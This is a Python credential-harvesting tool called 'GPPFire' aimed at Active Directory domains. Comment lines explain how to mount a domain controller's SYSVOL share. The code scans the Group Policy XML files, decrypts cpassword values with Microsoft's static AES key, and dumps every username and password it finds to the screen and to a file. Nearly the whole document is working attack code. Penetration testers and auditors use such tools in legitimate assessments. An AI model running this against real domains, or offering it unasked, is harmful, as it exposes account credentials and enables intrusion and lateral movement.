#
# GPPFire - (GPP Passwords) - LiquidSky
# 
# Finds passwords in SYSVOL
# ________________________________
#
# First mount the drive & then run the script:
#
# 1. sudo apt install cifs-utils -y
#
# 2. sudo mkdir /mnt/sysvol
#
# 3. sudo mount -t cifs //dc01.se.usa/SYSVOL /mnt/sysvol \
#  -o username=YOURADUSER,password=YOURPASSWORD,domain=se.usa,vers=3.0
#
# 4. python gpp.py


import os
import re
import base64
from Crypto.Cipher import AES

# --- CONFIG ---
SYSVOL_PATH = "/mnt/sysvol/evil.corp/Policies" #Update evil.corp with your AD domain
OUTPUT_FILE = "GPP_Found.txt"

# Microsoft AES Key (static)
GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057990209b09a433b66c1b"
)

def decrypt_cpassword(cpass_b64):
    try:
        data = base64.b64decode(cpass_b64)
        iv = b"\x00" * 16
        cipher = AES.new(GPP_KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data)
        return decrypted.decode("utf-16le").rstrip("\x00")
    except Exception as e:
        return f"[Decryption failed: {str(e)}]"

def parse_xml_file(path):
    try:
        with open(path, 'r', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        return []

    found = []

    # Look for DefaultUserName
    username_match = re.search(r'name="DefaultUserName".*?value="([^"]+)"', content, re.I | re.S)
    username = username_match.group(1) if username_match else None

    # Look for DefaultPassword
    for pwd_match in re.finditer(r'name="DefaultPassword".*?value="([^"]+)"', content, re.I | re.S):
        password = pwd_match.group(1)
        found.append((path, username, password))

    # Look for cpassword (usually in Groups.xml)
    for cpass_match in re.finditer(r'cpassword="([^"]+)"', content, re.I):
        enc = cpass_match.group(1)
        dec = decrypt_cpassword(enc)
        # Try to get the username near it
        user_match = re.search(r'user(Name)?="([^"]+)"', content)
        user = user_match.group(2) if user_match else "[unknown]"
        found.append((path, user, dec))

    # Look for <Password>plaintext</Password>
    for tag_match in re.finditer(r'<(\w*password\w*)>([^<]+)</\1>', content, re.I):
        tag = tag_match.group(1)
        value = tag_match.group(2)
        found.append((path, f"[tag:{tag}]", value))

    return found

# --- Main ---
results = []

for root, _, files in os.walk(SYSVOL_PATH):
    for file in files:
        if file.lower().endswith(".xml"):
            full_path = os.path.join(root, file)
            matches = parse_xml_file(full_path)
            results.extend(matches)

# Output
with open(OUTPUT_FILE, 'w') as f:
    for path, user, password in results:
        print(f"[+] File: {path}")
        print(f"    Username: {user}")
        print(f"    Password: {password}\n")

        f.write(f"[+] File: {path}\n")
        f.write(f"    Username: {user}\n")
        f.write(f"    Password: {password}\n\n")

print(f"[*] Done. Results saved to: {OUTPUT_FILE}")
